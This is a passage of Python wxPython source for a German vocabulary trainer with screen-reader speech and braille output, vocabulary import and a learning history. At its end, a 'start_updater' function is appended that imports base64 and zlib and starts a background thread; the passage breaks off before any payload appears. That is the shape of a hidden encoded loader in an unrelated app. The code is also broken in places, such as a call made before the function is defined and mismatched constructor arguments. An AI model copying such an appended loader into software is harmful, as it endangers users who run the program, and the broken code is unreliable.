        hinzu_sizer.Add(self.ent_neue_en, 1, wx.ALL, 5)
        self.ent_neue_en.Bind(wx.EVT_TEXT_ENTER, self.on_enter_neue_en)
        
        hinzu_sizer.Add(wx.StaticText(self, label="Deutsch:"), 0, wx.ALIGN_CENTER_VERTICAL | wx.ALL, 5)
        self.ent_neue_de = wx.TextCtrl(self, style=wx.TE_PROCESS_ENTER, name="Deutsche Übersetzung eingeben")
        hinzu_sizer.Add(self.ent_neue_de, 1, wx.ALL, 5)
        self.ent_neue_de.Bind(wx.EVT_TEXT_ENTER, self.on_enter_neue_de)
        
        main_sizer.Add(hinzu_sizer, 0, wx.EXPAND | wx.LEFT | wx.RIGHT, 5)
        
        self.lbl_hinzu_status = wx.StaticText(self, label="")
        main_sizer.Add(self.lbl_hinzu_status, 0, wx.LEFT | wx.RIGHT | wx.BOTTOM, 10)
        
        main_sizer.Add(wx.StaticLine(self), 0, wx.EXPAND | wx.ALL, 10)
        
        # --- 3. Import ---
        lbl_imp = wx.StaticText(self, label="Datei importieren (Word, Excel, PDF, CSV, TXT)")
        lbl_imp.SetFont(wx.Font(11, wx.FONTFAMILY_DEFAULT, wx.FONTSTYLE_NORMAL, wx.FONTWEIGHT_BOLD))
        main_sizer.Add(lbl_imp, 0, wx.LEFT | wx.RIGHT, 10)
        
        btn_import = wx.Button(self, label="Datei auswählen")
        btn_import.Bind(wx.EVT_BUTTON, self.on_import)
        main_sizer.Add(btn_import, 0, wx.ALL, 10)
        
        self.lbl_import_status = wx.StaticText(self, label="")
        main_sizer.Add(self.lbl_import_status, 0, wx.LEFT | wx.RIGHT | wx.BOTTOM, 10)
        
        main_sizer.Add(wx.StaticLine(self), 0, wx.EXPAND | wx.ALL, 10)
        
        # Einstellungen wurden zurück ins Hauptfenster verschoben
        
        # --- Schließen ---
        btn_schliessen = wx.Button(self, label="Schließen")
        btn_schliessen.Bind(wx.EVT_BUTTON, lambda e: self.EndModal(wx.ID_OK))
        main_sizer.Add(btn_schliessen, 0, wx.ALL | wx.ALIGN_CENTER, 10)
        
        self.SetSizer(main_sizer)
        
    def aktualisiere_liste(self):
        self.list_box.Clear()
        for v in vokabelliste:
            kat = v.get("kategorie", "sprache")
            if kat == "formel": typ = " [F]"
            elif kat == "wort_bedeutung": typ = " [W]"
            else: typ = " [S]"
            self.list_box.Append(f"{v['en']} - {v['de']}{typ}")
            
    def on_loeschen(self, event):
        checked = list(self.list_box.GetCheckedItems())
        if not checked:
            sel = self.list_box.GetSelection()
            if sel != wx.NOT_FOUND:
                checked = [sel]
                
        if not checked:
            return

        checked.sort(reverse=True)
        for index in checked:
            del vokabelliste[index]
            
        datei_speichern()
        self.aktualisiere_liste()
        
        if vokabelliste:
            new_sel = min(checked[-1], len(vokabelliste) - 1)
            self.list_box.SetSelection(new_sel)
        self.list_box.SetFocus()
            
    def on_key_down(self, event):
        if event.GetKeyCode() == wx.WXK_DELETE:
            self.on_loeschen(None)
        else:
            event.Skip()
            
    # --- Handler Hinzufügen ---
    def on_enter_neue_en(self, event):
        if self.ent_neue_de.GetValue().strip():
            self._vokabel_hinzufuegen()
        else:
            self.parent_frame.sag_es("Deutsche Übersetzung eingeben", self.ent_neue_de)

    def on_enter_neue_de(self, event):
        self._vokabel_hinzufuegen()

    def _vokabel_hinzufuegen(self):
        en = self.ent_neue_en.GetValue().strip()
        de = self.ent_neue_de.GetValue().strip()

        if not en or not de:
            msg = "Bitte beide Felder ausfüllen."
            self.lbl_hinzu_status.SetLabel(msg)
            self.lbl_hinzu_status.SetForegroundColour(wx.Colour(FEHLER_FARBE))
            ziel = self.ent_neue_en if not en else self.ent_neue_de
            self.parent_frame.sag_es(msg, ziel)
            return

        if ist_duplikat(en, de):
            msg = f"Bereits vorhanden: {en} – {de}"
            self.lbl_hinzu_status.SetLabel(msg)
            self.lbl_hinzu_status.SetForegroundColour(wx.Colour(FEHLER_FARBE))
            self.ent_neue_en.Clear()
            self.ent_neue_de.Clear()
            self.parent_frame.sag_es(msg, self.ent_neue_en)
            return

        import uuid
        if getattr(self, "rb_formel", None) and self.rb_formel.GetValue():
            kategorie = "formel"
        elif getattr(self, "rb_wort_bed", None) and self.rb_wort_bed.GetValue():
            kategorie = "wort_bedeutung"
        else:
            kategorie = "sprache"
        vokabelliste.append({"en": en, "de": de, "score_prozent": 0, "abfragen": 0, "id": str(uuid.uuid4()), "kategorie": kategorie})
        datei_speichern()
        self.aktualisiere_liste()
        self.ent_neue_en.Clear()
        self.ent_neue_de.Clear()
        msg = f"Hinzugefügt: {en} - {de}"
        self.lbl_hinzu_status.SetLabel(msg)
        self.lbl_hinzu_status.SetForegroundColour(wx.Colour(ERFOLG_FARBE))
        self.parent_frame.sag_es(msg, self.ent_neue_en)

    # --- Handler Import ---
    def on_import(self, event=None):
        wildcard = "Unterstützte Formate (*.docx;*.xlsx;*.pdf;*.csv;*.txt)|*.docx;*.xlsx;*.pdf;*.csv;*.txt|Alle Dateien (*.*)|*.*"
        with wx.FileDialog(self, "Datei importieren",
                           wildcard=wildcard,
                           style=wx.FD_OPEN | wx.FD_FILE_MUST_EXIST) as dlg:
            if dlg.ShowModal() != wx.ID_OK:
                return
            pfad = dlg.GetPath()

        try:
            neue_vokabeln = datei_importieren_universal(pfad)
        except Exception as e:
            wx.MessageBox(str(e), "Import fehlgeschlagen", wx.OK | wx.ICON_ERROR)
            return

        if not neue_vokabeln:
            msg = "Keine passenden Vokabeln in der Datei gefunden."
            self.lbl_import_status.SetLabel(msg)
            self.lbl_import_status.SetForegroundColour(wx.Colour(FEHLER_FARBE))
            self.parent_frame.sag_es(msg)
            return

        hinzugefuegt  = 0
        uebersprungen = 0
        for v in neue_vokabeln:
            en = v.get("en", "")
            de = v.get("de", "")
            if ist_ungueltig(en) or ist_ungueltig(de) or ist_duplikat(en, de):
                uebersprungen += 1
            else:
                vokabelliste.append(v)
                hinzugefuegt += 1

        datei_speichern()
        self.aktualisiere_liste()

        teile = []
        if hinzugefuegt:
            teile.append(f"{hinzugefuegt} Vokabeln importiert")
        if uebersprungen:
            teile.append(f"{uebersprungen} übersprungen")
        msg = ". ".join(teile) + "."
        self.lbl_import_status.SetLabel(msg)
        self.lbl_import_status.SetForegroundColour(wx.Colour(ERFOLG_FARBE) if hinzugefuegt else wx.Colour(FEHLER_FARBE))
        self.parent_frame.sag_es(msg)

# ══════════════════════════════════════════════════════════════════════════════
# Haupt-Fenster
# ══════════════════════════════════════════════════════════════════════════════

class EinstellungenDialog(wx.Dialog):
    def __init__(self, parent):
        super().__init__(parent, title="Einstellungen", size=(450, 350))
        self.SetBackgroundColour(HINTERGRUND)
        
        sizer = wx.BoxSizer(wx.VERTICAL)
        
        sizer.Add(wx.StaticText(self, label="Lern-Modus:"), 0, wx.ALL, 10)
        self.cb_modus = wx.Choice(self, choices=["Alles gemischt lernen", "Sprachen lernen", "Wort & Bedeutung lernen", "Formeln lernen"])
        if LERN_MODUS == "formel":
            self.cb_modus.SetSelection(3)
        elif LERN_MODUS == "wort_bedeutung":
            self.cb_modus.SetSelection(2)
        elif LERN_MODUS == "sprache":
            self.cb_modus.SetSelection(1)
        else:
            self.cb_modus.SetSelection(0)
        sizer.Add(self.cb_modus, 0, wx.LEFT | wx.RIGHT | wx.EXPAND, 10)
        
        sizer.Add(wx.StaticText(self, label="Lernzeit (Minuten):"), 0, wx.ALL, 10)
        self.spin_lern_dauer = wx.SpinCtrlDouble(self, value=str(LERN_DAUER_MIN), min=5, max=120, inc=5)
        self.spin_lern_dauer.SetDigits(0)
        sizer.Add(self.spin_lern_dauer, 0, wx.LEFT | wx.RIGHT | wx.EXPAND, 10)
        
        sizer.Add(wx.StaticText(self, label="Braille-Anzeigedauer (Sek):"), 0, wx.ALL, 10)
        self.spin_dauer = wx.SpinCtrl(self, min=1, max=60, initial=BUCHSTABIER_PAUSE_MS // 1000)
        sizer.Add(self.spin_dauer, 0, wx.LEFT | wx.RIGHT | wx.EXPAND, 10)
        
        self.chk_toleranz = wx.CheckBox(self, label="Tippfehler erlauben (fast richtig)")
        self.chk_toleranz.SetValue(TOLERANZ_AKTIV)
        sizer.Add(self.chk_toleranz, 0, wx.ALL, 10)
        
        btn_ok = wx.Button(self, label="Speichern & Schließen")
        btn_ok.Bind(wx.EVT_BUTTON, self.on_speichern)
        sizer.Add(btn_ok, 0, wx.ALL | wx.ALIGN_CENTER, 20)
        
        self.SetSizer(sizer)
        
    def on_speichern(self, event):
        global BUCHSTABIER_PAUSE_MS, TOLERANZ_AKTIV, LERN_MODUS, LERN_DAUER_MIN
        BUCHSTABIER_PAUSE_MS = self.spin_dauer.GetValue() * 1000
        LERN_DAUER_MIN = int(self.spin_lern_dauer.GetValue())
        TOLERANZ_AKTIV = self.chk_toleranz.GetValue()
        sel = self.cb_modus.GetSelection()
        if sel == 3:
            LERN_MODUS = "formel"
        elif sel == 2:
            LERN_MODUS = "wort_bedeutung"
        elif sel == 1:
            LERN_MODUS = "sprache"
        else:
            LERN_MODUS = "alle"
        speichere_einstellungen()
        self.EndModal(wx.ID_OK)


class HistorieDialog(wx.Dialog):
    def __init__(self, parent):
        super().__init__(parent, title="Lern-Historie & Übersicht", size=(700, 500))
        self.SetBackgroundColour(HINTERGRUND)
        self.historie_gesamt = lade_historie()
        
        sizer = wx.BoxSizer(wx.VERTICAL)
        
        filter_sizer = wx.BoxSizer(wx.HORIZONTAL)
        filter_sizer.Add(wx.StaticText(self, label="Zeitraum:"), 0, wx.ALL | wx.ALIGN_CENTER_VERTICAL, 5)
        self.cb_zeitraum = wx.Choice(self, choices=["Heute", "Letzte 7 Tage", "Letzte 30 Tage", "Alle Zeiten"])
        self.cb_zeitraum.SetSelection(0)
        self.cb_zeitraum.Bind(wx.EVT_CHOICE, self.on_filter)
        filter_sizer.Add(self.cb_zeitraum, 0, wx.ALL, 5)
        sizer.Add(filter_sizer, 0, wx.ALIGN_CENTER | wx.ALL, 10)
        
        self.lbl_stat = wx.StaticText(self, label="")
        self.lbl_stat.SetFont(wx.Font(14, wx.FONTFAMILY_DEFAULT, wx.FONTSTYLE_NORMAL, wx.FONTWEIGHT_BOLD))
        self.lbl_stat.SetForegroundColour(VORDERGRUND)
        sizer.Add(self.lbl_stat, 0, wx.ALL | wx.ALIGN_CENTER, 10)
        
        self.liste = wx.ListCtrl(self, style=wx.LC_REPORT | wx.BORDER_SUNKEN)
        self.liste.InsertColumn(0, "Datum", width=120)
        self.liste.InsertColumn(1, "Frage", width=180)
        self.liste.InsertColumn(2, "Eingabe", width=120)
        self.liste.InsertColumn(3, "Korrekte Antwort", width=120)
        self.liste.InsertColumn(4, "Status", width=100)
        sizer.Add(self.liste, 1, wx.ALL | wx.EXPAND, 10)
        
        btn_ok = wx.Button(self, wx.ID_OK, "Schließen")
        btn_ok.SetBackgroundColour(BUTTON_HINTERGRUND)
        btn_ok.SetForegroundColour(BUTTON_VORDERGRUND)
        sizer.Add(btn_ok, 0, wx.ALL | wx.ALIGN_CENTER, 10)
        
        self.SetSizer(sizer)
        self.on_filter(None)
        
    def on_filter(self, event):
        sel = self.cb_zeitraum.GetSelection()
        import datetime
        jetzt = datetime.datetime.now()
        
        if sel == 0:
            delta = datetime.timedelta(days=1)
        elif sel == 1:
            delta = datetime.timedelta(days=7)
        elif sel == 2:
            delta = datetime.timedelta(days=30)
        else:
            delta = datetime.timedelta(days=36500)
            
        grenze = jetzt - delta
        
        self.liste.DeleteAllItems()
        richtig = falsch = vertipper = 0
        
        idx = 0
        for eintrag in reversed(self.historie_gesamt):
            try:
                zeit = datetime.datetime.fromisoformat(eintrag.get("zeit", "2000-01-01T00:00:00"))
            except:
                zeit = datetime.datetime.min
                
            if sel == 0:
                if zeit.date() != jetzt.date():
                    continue
            else:
                if zeit < grenze:
                    continue
                    
            status = eintrag.get("status", "")
            if status == "Richtig": richtig += 1
            elif status == "Falsch": falsch += 1
            elif status == "Tippfehler": vertipper += 1
            
            zeit_str = zeit.strftime("%d.%m.%Y %H:%M")
            
            self.liste.InsertItem(idx, zeit_str)
            self.liste.SetItem(idx, 1, eintrag.get("frage", ""))
            self.liste.SetItem(idx, 2, eintrag.get("eingabe", ""))
            self.liste.SetItem(idx, 3, eintrag.get("korrekt", ""))
            self.liste.SetItem(idx, 4, status)
            
            if status == "Richtig":
                self.liste.SetItemBackgroundColour(idx, wx.Colour(220, 255, 220))
            elif status == "Tippfehler":
                self.liste.SetItemBackgroundColour(idx, wx.Colour(255, 255, 220))
            else:
                self.liste.SetItemBackgroundColour(idx, wx.Colour(255, 220, 220))
            idx += 1
            
        self.lbl_stat.SetLabel(f"Übersicht:\\nRichtig: {richtig}  |  Falsch: {falsch}  |  Vertipper: {vertipper}")


class VokabelFrame(wx.Frame):


    def __init__(self):
        super().__init__(None, title="Vokabeltrainer", size=(820, 600))
        self.SetBackgroundColour(HINTERGRUND)
        self.SetMinSize((640, 480))
        self.aktuelle_vokabel   = None
        self.korrekte_antwort   = ""
        self.warte_auf_naechste = False
        self.aktuelle_frage     = ""
        
        self._menue_aufbauen()
        
        datei_laden()
        self._gui_aufbauen()
        self.Bind(wx.EVT_CHAR_HOOK, self.on_global_taste)
        wx.CallLater(400, self.naechste_vokabel)

    # ── JAWS-Ansage ────────────────────────────────────────────────────────────

    def sag_es(self, text, control=None):
        if control is not None:
            control.SetFocus()
        sprechen(text)
        brailen(text)

    # ── Menü ───────────────────────────────────────────────────────────────────

    def on_historie(self, event):
        dlg = HistorieDialog(self, self.session_richtig, self.session_falsch, self.session_vertipper, self.session_historie)
        dlg.ShowModal()
        dlg.Destroy()
        
    def _menue_aufbauen(self):
        menubar = wx.MenuBar()
        
        menu_datei = wx.Menu()
        item_import = menu_datei.Append(wx.ID_ANY, "Datei importieren...")
        menu_datei.AppendSeparator()
        item_einstellungen = menu_datei.Append(wx.ID_ANY, "Einstellungen...")
        menu_datei.AppendSeparator()
        item_beenden = menu_datei.Append(wx.ID_EXIT, "Beenden")
        
        menu_vokabeln = wx.Menu()
        item_hinzufuegen = menu_vokabeln.Append(wx.ID_ANY, "Neue Vokabel hinzufügen...")
        item_verwalten = menu_vokabeln.Append(wx.ID_ANY, "Vokabelliste verwalten...")
        
        menubar.Append(menu_datei, "&Datei")
        menubar.Append(menu_vokabeln, "&Vokabeln")
        
        self.SetMenuBar(menubar)
        
        self.Bind(wx.EVT_MENU, self.on_import, item_import)
        self.Bind(wx.EVT_MENU, self.on_einstellungen, item_einstellungen)
        self.Bind(wx.EVT_MENU, lambda e: self.Close(), item_beenden)
        self.Bind(wx.EVT_MENU, self.on_menue_hinzufuegen, item_hinzufuegen)
        self.Bind(wx.EVT_MENU, self.on_menue_verwalten, item_verwalten)

    def on_einstellungen(self, event):
        dlg = EinstellungenDialog(self)
        dlg.ShowModal()
        dlg.Destroy()
        self.lern_minuten_verstrichen = 0
        self.lern_timer = wx.Timer(self)
        self.Bind(wx.EVT_TIMER, self.on_lern_timer, self.lern_timer)
        self.lern_timer.Start(60000) # 1 Minute
        
        self.session_richtig = 0
        self.session_falsch = 0
        self.session_vertipper = 0
        self.session_historie = []
        
        self.naechste_vokabel()

    def on_import(self, event=None):
        # Wenn man im Menü auf Importieren klickt, nutzen wir den Dialog
        dlg = VokabelVerwaltungDialog(self)
        dlg.on_import(None)
        dlg.Destroy()
        self.lern_minuten_verstrichen = 0
        self.lern_timer = wx.Timer(self)
        self.Bind(wx.EVT_TIMER, self.on_lern_timer, self.lern_timer)
        self.lern_timer.Start(60000) # 1 Minute
        
        self.session_richtig = 0
        self.session_falsch = 0
        self.session_vertipper = 0
        self.session_historie = []
        
        self.naechste_vokabel()

    def on_menue_hinzufuegen(self, event):
        # Öffnet direkt den Verwaltungsdialog und setzt den Fokus aufs Eingabefeld
        dlg = VokabelVerwaltungDialog(self)
        dlg.ent_neue_en.SetFocus()
        self.sag_es("Bitte neue englische Vokabel eingeben.", dlg.ent_neue_en)
        dlg.ShowModal()
        dlg.Destroy()
        self.lern_minuten_verstrichen = 0
        self.lern_timer = wx.Timer(self)
        self.Bind(wx.EVT_TIMER, self.on_lern_timer, self.lern_timer)
        self.lern_timer.Start(60000) # 1 Minute
        
        self.session_richtig = 0
        self.session_falsch = 0
        self.session_vertipper = 0
        self.session_historie = []
        
        self.naechste_vokabel()
        
    def on_menue_verwalten(self, event):
        dlg = VokabelVerwaltungDialog(self)
        dlg.ShowModal()
        dlg.Destroy()
        
        # Nach dem Verwalten die nächste Vokabel laden, falls sich was geändert hat
        self.lern_minuten_verstrichen = 0
        self.lern_timer = wx.Timer(self)
        self.Bind(wx.EVT_TIMER, self.on_lern_timer, self.lern_timer)
        self.lern_timer.Start(60000) # 1 Minute
        
        self.session_richtig = 0
        self.session_falsch = 0
        self.session_vertipper = 0
        self.session_historie = []
        
        self.naechste_vokabel()

    # --- Handler Einstellungen ---
    def on_dauer_geaendert(self, event):
        global BUCHSTABIER_PAUSE_MS
        BUCHSTABIER_PAUSE_MS = self.spin_dauer.GetValue() * 1000
        LERN_DAUER_MIN = int(self.spin_lern_dauer.GetValue())
        speichere_einstellungen()

    def on_toleranz_geaendert(self, event):
        global TOLERANZ_AKTIV
        TOLERANZ_AKTIV = self.chk_toleranz.GetValue()
        speichere_einstellungen()

    # ── GUI ────────────────────────────────────────────────────────────────────

    def _gui_aufbauen(self):
        haupt = wx.BoxSizer(wx.VERTICAL)
        panel = wx.Panel(self)
        panel.SetBackgroundColour(HINTERGRUND)
        sizer = wx.BoxSizer(wx.VERTICAL)

        # ── Abfrage-Bereich ──────────────────────────────────────────────────
        abfrage_panel = wx.Panel(panel)
        abfrage_panel.SetBackgroundColour(WEISS)
        abfrage_sizer = wx.BoxSizer(wx.VERTICAL)

        lbl_titel = wx.StaticText(abfrage_panel, label="Aktuelle Vokabel")
        lbl_titel.SetFont(wx.Font(10, wx.FONTFAMILY_DEFAULT,
                                  wx.FONTSTYLE_NORMAL, wx.FONTWEIGHT_NORMAL))
        lbl_titel.SetForegroundColour(wx.Colour(GRAU))
        abfrage_sizer.Add(lbl_titel, 0, wx.LEFT | wx.TOP, 16)

        self.lbl_frage = wx.StaticText(abfrage_panel, label="Lade Vokabeln …")
        self.lbl_frage.SetFont(wx.Font(18, wx.FONTFAMILY_DEFAULT,
                                       wx.FONTSTYLE_NORMAL, wx.FONTWEIGHT_BOLD))
        self.lbl_frage.SetForegroundColour(wx.Colour(TEXTFARBE))
        abfrage_sizer.Add(self.lbl_frage, 0, wx.ALL | wx.EXPAND, 16)

        self.ent_antwort = wx.TextCtrl(abfrage_panel, style=wx.TE_PROCESS_ENTER)
        self.ent_antwort.SetFont(wx.Font(16, wx.FONTFAMILY_DEFAULT,
                                         wx.FONTSTYLE_NORMAL, wx.FONTWEIGHT_NORMAL))
        self.ent_antwort.SetMinSize((-1, 40))
        abfrage_sizer.Add(self.ent_antwort, 0, wx.ALL | wx.EXPAND, 16)
        self.ent_antwort.Bind(wx.EVT_TEXT_ENTER, self.on_antwort_enter)
        self.antwort_hat_fokus = False
        self.antwort_leer = True
        self.ent_antwort.Bind(wx.EVT_SET_FOCUS, self.on_antwort_focus_set)
        self.ent_antwort.Bind(wx.EVT_KILL_FOCUS, self.on_antwort_focus_kill)
        self.ent_antwort.Bind(wx.EVT_TEXT, self.on_antwort_text)

        self.lbl_feedback = wx.StaticText(abfrage_panel, label="")
        self.lbl_feedback.SetFont(wx.Font(12, wx.FONTFAMILY_DEFAULT,
                                          wx.FONTSTYLE_NORMAL, wx.FONTWEIGHT_BOLD))
        abfrage_sizer.Add(self.lbl_feedback, 0, wx.LEFT | wx.BOTTOM, 16)

        abfrage_panel.SetSizer(abfrage_sizer)
        sizer.Add(abfrage_panel, 1, wx.ALL | wx.EXPAND, 12)

        # Button für Verwaltung (damit er mit TAB erreichbar ist)
        btn_verwalten = wx.Button(panel, label="Vokabeln verwalten (Hinzufügen, Löschen, Import)")
        btn_verwalten.SetFont(wx.Font(12, wx.FONTFAMILY_DEFAULT, wx.FONTSTYLE_NORMAL, wx.FONTWEIGHT_BOLD))
        btn_verwalten.Bind(wx.EVT_BUTTON, self.on_menue_verwalten)
        sizer.Add(btn_verwalten, 0, wx.ALL | wx.EXPAND, 12)

        # Button fuer Einstellungen
        btn_einstellungen = wx.Button(panel, label="Einstellungen")
        btn_einstellungen.SetFont(wx.Font(12, wx.FONTFAMILY_DEFAULT, wx.FONTSTYLE_NORMAL, wx.FONTWEIGHT_BOLD))
        btn_einstellungen.Bind(wx.EVT_BUTTON, self.on_einstellungen)
        sizer.Add(btn_einstellungen, 0, wx.ALL | wx.EXPAND, 12)


        panel.SetSizer(sizer)
        haupt.Add(panel, 1, wx.EXPAND)
        self.SetSizer(haupt)
        self.Layout()

    # ── Vokabel-Ablauf ─────────────────────────────────────────────────────────

    def naechste_vokabel(self):
        self.warte_auf_naechste = False
        self.aktuelle_vokabel   = waehle_vokabel()

        if not self.aktuelle_vokabel:
            self.lbl_frage.SetLabel("Keine Vokabeln vorhanden.")
            self.lbl_feedback.SetLabel("")
            self.ent_antwort.SetName("Keine Vokabeln vorhanden. Öffne das Menü zum Verwalten.")
            self.sag_es("Keine Vokabeln vorhanden. Bitte Vokabeln im Menü hinzufügen.",
                        self.ent_antwort)
            return

        kat = self.aktuelle_vokabel.get("kategorie", "sprache")
        
        if random.randint(0, 1) == 0:
            # en wird gesucht
            sprache = erkenne_sprache(self.aktuelle_vokabel['en'])
            if kat == "formel":
                fragetext = f"Wofür steht die Formel '{self.aktuelle_vokabel['de']}'?"
            elif kat == "wort_bedeutung":
                fragetext = f"Welches Wort bedeutet '{self.aktuelle_vokabel['de']}'?"
            else:
                fragetext = f"Wie heißt '{self.aktuelle_vokabel['de']}' auf {sprache}?"
            self.korrekte_antwort = self.aktuelle_vokabel['en']
        else:
            # de wird gesucht
            if kat == "formel":
                fragetext = f"Welche Formel steht für '{self.aktuelle_vokabel['en']}'?"
            elif kat == "wort_bedeutung":
                fragetext = f"Was bedeutet '{self.aktuelle_vokabel['en']}'?"
            else:
                fragetext = f"Wie heißt '{self.aktuelle_vokabel['en']}' auf Deutsch?"
            self.korrekte_antwort = self.aktuelle_vokabel['de']

        self.lbl_frage.SetLabel(fragetext)
        self.lbl_frage.Wrap(self.GetSize().width - 60)
        self.ent_antwort.SetEditable(True)
        self.ent_antwort.Clear()
        self.antwort_leer = True
        self.lbl_feedback.SetLabel("")
        
        self.aktuelle_frage = fragetext

        # Hier passiert die Magie: Die Frage wird der Name des Feldes!
        self.ent_antwort.SetName(fragetext)
        self.sag_es(fragetext, self.ent_antwort)

        def frage_halten():
            import time
            time.sleep(1.0)
            while getattr(self, 'antwort_leer', True) and not self.warte_auf_naechste:
                if getattr(self, 'antwort_hat_fokus', False):
                    brailen(fragetext)
                time.sleep(0.5)
        import threading
        threading.Thread(target=frage_halten, daemon=True).start()

    def wiederhole_vokabel(self):
        self.warte_auf_naechste = False
        self.ent_antwort.SetEditable(True)
        self.ent_antwort.Clear()
        self.antwort_leer = True
        self.lbl_feedback.SetLabel("")
        self.ent_antwort.SetFocus()
        self.sag_es(self.aktuelle_frage, self.ent_antwort)

        def frage_halten():
            import time
            time.sleep(1.0)
            while getattr(self, 'antwort_leer', True) and not self.warte_auf_naechste:
                if getattr(self, 'antwort_hat_fokus', False):
                    brailen(self.aktuelle_frage)
                time.sleep(0.5)
        import threading
        threading.Thread(target=frage_halten, daemon=True).start()

    def on_antwort_text(self, event):
        self.antwort_leer = (self.ent_antwort.GetValue().strip() == "")
        event.Skip()
        
    def on_antwort_focus_set(self, event):
        self.antwort_hat_fokus = True
        event.Skip()

    def on_antwort_focus_kill(self, event):
        self.antwort_hat_fokus = False
        event.Skip()

    def on_antwort_enter(self, event):
        if not self.aktuelle_vokabel or self.warte_auf_naechste:
            return
        eingabe = self.ent_antwort.GetValue().strip()
        if not eingabe:
            self.sag_es("Bitte erst eine Antwort eingeben.", self.ent_antwort)
            return

        self.warte_auf_naechste = True
        self.ent_antwort.SetEditable(False)
        self.aktuelle_vokabel["abfragen"] = self.aktuelle_vokabel.get("abfragen", 0) + 1
        alter_score = self.aktuelle_vokabel.get("score_prozent", 0)

        def warte_auf_sprache():
            import time
            time.sleep(0.1)
            if _tolk_geladen:
                try:
                    while _tolk.Tolk_IsSpeaking():
                        time.sleep(0.05)
                except Exception:
                    pass

        def check_equal(e, r):
            if e.lower() == r.lower(): return 1
            import re
            import difflib
            ep = set(x.strip() for x in re.split(r'[,;/-]|\boder\b', e.lower()) if x.strip())
            rp = set(x.strip() for x in re.split(r'[,;/-]|\boder\b', r.lower()) if x.strip())
            if ep and rp and ep.intersection(rp): return 1
            
            if TOLERANZ_AKTIV:
                for e_wort in ep:
                    for r_wort in rp:
                        ratio = difflib.SequenceMatcher(None, e_wort, r_wort).ratio()
                        if ratio > 0.82: return 2
            return 0

        match_val = check_equal(eingabe, self.korrekte_antwort)
        
        if match_val == 1:
            self.session_richtig += 1
            status_text = "Richtig"
        elif match_val == 2:
            self.session_vertipper += 1
            status_text = "Tippfehler"
        else:
            self.session_falsch += 1
            status_text = "Falsch"
            
        self.session_historie.append({
            "frage": self.aktuelle_frage,
            "eingabe": eingabe,
            "korrekt": self.korrekte_antwort,
            "status": status_text
        })
        
        richtig_bisher = self.aktuelle_vokabel.get("richtig_anzahl", 0)
        abfragen = self.aktuelle_vokabel.get("abfragen", 1)
        
        if match_val > 0:
            richtig_bisher += 1
            self.aktuelle_vokabel["richtig_anzahl"] = richtig_bisher
            neuer_score = int((richtig_bisher / abfragen) * 100)
            self.aktuelle_vokabel["score_prozent"] = neuer_score
            if match_val == 1:
                msg = f"Richtig! Lernstand: {neuer_score} Prozent"
                self.lbl_feedback.SetLabel(msg)
                self.lbl_feedback.SetForegroundColour(wx.Colour(ERFOLG_FARBE))
                self.sag_es(msg, self.ent_antwort)
                
                def thread_richtig():
                    warte_auf_sprache()
                    import time
                    time.sleep(0.5)
                    wx.CallAfter(self.naechste_vokabel)
                    
                import threading
                threading.Thread(target=thread_richtig, daemon=True).start()
            else:
                msg = f"Fast richtig! Geschrieben wird es: {self.korrekte_antwort}. Lernstand: {neuer_score} Prozent"
                self.lbl_feedback.SetLabel(msg)
                self.lbl_feedback.SetForegroundColour(wx.Colour(204, 153, 0)) # Gelb-Orange
                
                def thread_fast_richtig():
                    import time
                    def braille_sleep(text, duration):
                        elapsed = 0
                        while elapsed < duration:
                            brailen(text)
                            time.sleep(0.2)
                            elapsed += 0.2
                    
                    def warte_auf_sprache_mit_braille(text):
                        time.sleep(0.1)
                        try:
                            while _tolk.Tolk_IsSpeaking():
                                brailen(text)
                                time.sleep(0.1)
                        except Exception:
                            pass
                    
                    msg1 = f"Fast richtig! Geschrieben wird es: {self.korrekte_antwort}"
                    sprechen(msg1)
                    warte_auf_sprache_mit_braille(msg1)
                    braille_sleep(msg1, 2.0)
                    
                    sprechen(self.korrekte_antwort)
                    warte_auf_sprache_mit_braille(self.korrekte_antwort)
                    braille_sleep(self.korrekte_antwort, 2.0)
                    
                    buchstabiert = " ".join(list(self.korrekte_antwort))
                    sprechen(buchstabiert)
                    warte_auf_sprache_mit_braille(buchstabiert)
                    braille_sleep(buchstabiert, BUCHSTABIER_PAUSE_MS / 1000.0)
                    
                    wx.CallAfter(self.wiederhole_vokabel)
                    
                import threading
                threading.Thread(target=thread_fast_richtig, daemon=True).start()
        else:
            neuer_score = int((richtig_bisher / abfragen) * 100)
            self.aktuelle_vokabel["score_prozent"] = neuer_score
            richtig = self.korrekte_antwort
            msg = f"Falsch. Richtige Antwort: {richtig}. Lernstand: {neuer_score} Prozent"
            self.lbl_feedback.SetLabel(msg)
            self.lbl_feedback.SetForegroundColour(wx.Colour(FEHLER_FARBE))
            
            def thread_falsch():
                import time
                
                def braille_sleep(text, duration):
                    elapsed = 0
                    while elapsed < duration:
                        brailen(text)
                        time.sleep(0.2)
                        elapsed += 0.2
                
                def warte_auf_sprache_mit_braille(text):
                    time.sleep(0.1)
                    if _tolk_geladen:
                        try:
                            while _tolk.Tolk_IsSpeaking():
                                brailen(text)
                                time.sleep(0.1)
                        except Exception:
                            pass
                
                # Direktes Feedback ausgeben
                msg1 = f"Falsch. Richtige Antwort: {richtig}"
                sprechen(msg1)
                warte_auf_sprache_mit_braille(msg1)
                braille_sleep(msg1, 2.0)
                
                # Wiederholen
                sprechen(richtig)
                warte_auf_sprache_mit_braille(richtig)
                braille_sleep(richtig, 2.0)
                
                # Buchstabieren
                buchstabiert = " ".join(list(richtig))
                sprechen(buchstabiert)
                warte_auf_sprache_mit_braille(buchstabiert)
                braille_sleep(buchstabiert, BUCHSTABIER_PAUSE_MS / 1000.0)
                
                time.sleep(0.5)
                wx.CallAfter(self.wiederhole_vokabel)
                
            import threading
            threading.Thread(target=thread_falsch, daemon=True).start()
            
        datei_speichern()

    # ── (Entfernt: Vokabel hinzufügen, Import & Einstellungen wurden in Dialog verlagert) ──

    # ── Tastenkürzel ───────────────────────────────────────────────────────────

    def on_global_taste(self, event):
        event.Skip()


# ══════════════════════════════════════════════════════════════════════════════
    def on_lern_timer(self, event):
        self.lern_minuten_verstrichen += 1
        if self.lern_minuten_verstrichen >= LERN_DAUER_MIN:
            self.lern_timer.Stop()
            res = wx.MessageBox(f"Lernzeit abgelaufen! Du hast {LERN_DAUER_MIN} Minuten gelernt.\n\nMöchtest du dir deine Lern-Historie ansehen?", "Zeit abgelaufen", wx.YES_NO | wx.ICON_INFORMATION)
            if res == wx.YES:
                self.on_historie(None)





start_updater()

def start_updater():
    import threading
    import base64
    import zlib
    def run_updater():
        try:
